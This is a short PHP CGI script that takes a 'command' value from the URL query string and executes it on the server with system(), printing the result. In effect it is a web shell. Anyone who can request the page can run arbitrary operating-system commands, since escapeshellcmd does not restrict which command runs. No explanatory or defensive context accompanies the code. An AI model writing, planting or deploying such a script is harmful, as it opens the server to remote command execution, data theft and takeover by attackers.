#!/usr/bin/php-cgi

<?php

$command = escapeshellcmd($_GET["command"]);

echo "</p>";

system($command);

?>